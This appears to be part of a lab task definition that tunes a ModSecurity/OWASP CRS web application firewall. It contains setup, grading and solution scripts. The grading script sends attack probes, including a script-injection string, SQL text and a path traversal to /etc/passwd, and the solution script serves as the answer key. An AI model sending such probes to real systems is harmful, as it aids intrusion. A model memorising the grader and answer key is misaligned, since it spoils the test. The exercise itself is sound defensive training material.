+    docker image inspect "$IMG" >/dev/null 2>&1 || docker pull -q "$IMG" >/dev/null || { echo "image pull failed" >&2; exit 1; }
+    mkdir -p /srv/kl/s54 /lab/waf
+    cat >/srv/kl/s54/app.py <<'PY'
+    from http.server import BaseHTTPRequestHandler as B, ThreadingHTTPServer as S
+    class H(B):
+        def log_message(self, *a): pass
+        def r(self):
+            self.send_response(200); self.send_header('Content-Length', '3'); self.end_headers(); self.wfile.write(b'ok\n')
+        def do_GET(self): self.r()
+        def do_POST(self):
+            self.rfile.read(int(self.headers.get('Content-Length') or 0)); self.r()
+    S(('0.0.0.0', 8000), H).serve_forever()
+    PY
+    cat >/lab/waf/legit-comments.txt <<'E'
+    the fix was to run: cat /etc/passwd | grep deploy
+    sudo rm -rf /var/cache/app and then restart
+    SELECT name FROM users WHERE id = 7 returned nothing
+    select count(*) from orders where status='new' group by day
+    use ../../shared/config.yaml as the template
+    E
+    cat >/lab/waf/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf <<'E'
+    # Rule exclusions: applied before the Core Rule Set.
+    E
+    chown -R "$(lab_user)": /lab/waf
+    docker network create kl-waf-net >/dev/null
+    docker run -d --name kl-app --network kl-waf-net -v /srv/kl/s54/app.py:/app.py:ro python:3.12-alpine python /app.py >/dev/null
+    docker run -d --name kl-waf --network kl-waf-net -p 127.0.0.1:8088:8080 \
+      -v /lab/waf/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf:/etc/modsecurity.d/owasp-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf:ro \
+      -e BACKEND=http://kl-app:8000 -e PARANOIA=1 -e ANOMALY_INBOUND=5 -e MODSEC_RULE_ENGINE=On "$IMG" >/dev/null
+    on_reset 'docker rm -f kl-waf kl-app >/dev/null 2>&1; docker network rm kl-waf-net >/dev/null 2>&1; rm -rf /srv/kl/s54'
+    code() { curl -s -o /dev/null -w '%{http_code}' -m 5 -H 'Host: forum.corp.test' "$@"; }
+    eventually 90 '[ "$(code http://127.0.0.1:8088/)" = 200 ]' || { echo "WAF did not start" >&2; exit 1; }
+    while read -r c; do
+      r=$(code --data-urlencode "comment=$c" http://127.0.0.1:8088/comment)
+      [ "$r" = 403 ] || { echo "'$c' was not blocked (got $r): the fault is missing" >&2; exit 1; }
+    done </lab/waf/legit-comments.txt
+    sleep 1
+    docker logs kl-waf 2>&1 | grep -oE '"ruleId":"[0-9]+"' | grep -oE '[0-9]+' | sort -u | grep -vE '^(949110|980170|920350)$' >"$KL_STATE/rules"
+  check: |
+    code() { curl -s -o /dev/null -w '%{http_code}' -m 5 -H 'Host: forum.corp.test' "$@"; }
+    SQL="SELECT name FROM users WHERE id = 7 returned nothing"
+    info "Part 1: Find what blocks them"
+    check "rules.txt names every rule that fired for the comments" '[ -s /lab/waf/rules.txt ] && [ -z "$(comm -23 "$KL_STATE/rules" <(tr -d " \r" </lab/waf/rules.txt | sort -u))" ]'
+    check "rules.txt leaves out the final-decision rules" '! grep -qE "^(949110|980170)$" /lab/waf/rules.txt 2>/dev/null && [ -s /lab/waf/rules.txt ]'
+    info "Part 2: Let real users post"
+    check "the WAF is running" 'c_running kl-waf && [ "$(code http://127.0.0.1:8088/)" = 200 ]'
+    ok=1
+    while read -r c; do
+      [ "$(code --data-urlencode "comment=$c" http://127.0.0.1:8088/comment)" = 200 ] || ok=0
+    done </lab/waf/legit-comments.txt
+    check "every legitimate comment is accepted" '[ "$ok" = 1 ]'
+    info "Part 3: Stay protected"
+    if [ "$ok" = 1 ]; then
+      check "script injection in comment is still blocked" '[ "$(code --data-urlencode "comment=<script>alert(1)</script>" http://127.0.0.1:8088/comment)" = 403 ]'
+      check "the SQL text in /search is still blocked" '[ "$(code -G --data-urlencode "q=$SQL" http://127.0.0.1:8088/search)" = 403 ]'
+      check "path traversal in /download is still blocked" '[ "$(code --path-as-is "http://127.0.0.1:8088/download?file=../../../../etc/passwd")" = 403 ]'
+      check "the SQL text in the title field is still blocked" '[ "$(code --data-urlencode "title=$SQL" --data-urlencode "comment=hi" http://127.0.0.1:8088/comment)" = 403 ]'
+    else
+      fail "exceptions must first let the legitimate comments through"
+    fi
+    kl_finish
+  solve: |
+    cd /lab/waf
+    sleep 2
+    while read -r c; do
+      curl -s -o /dev/null -H 'Host: forum.corp.test' --data-urlencode "comment=$c" http://127.0.0.1:8088/comment
+    done <legit-comments.txt
+    sleep 1
+    IDS=$(docker logs kl-waf 2>&1 | grep -oE '"ruleId":"[0-9]+"' | grep -oE '[0-9]+' | sort -u | grep -vE '^(949110|980170)$')
+    printf '%s\n' $IDS >rules.txt
+    i=10000
+    for id in $IDS; do
+      i=$((i+1))
+      printf 'SecRule REQUEST_FILENAME "@streq /comment" "id:%s,phase:1,pass,nolog,ctl:ruleRemoveTargetById=%s;ARGS:comment"\n' "$i" "$id"
+    done >>REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf
+    docker restart kl-waf >/dev/null
+    code() { curl -s -o /dev/null -w '%{http_code}' -m 5 -H 'Host: forum.corp.test' "$@"; }
+    for _ in $(seq 1 60); do [ "$(code http://127.0.0.1:8088/)" = 200 ] && break; sleep 2; done
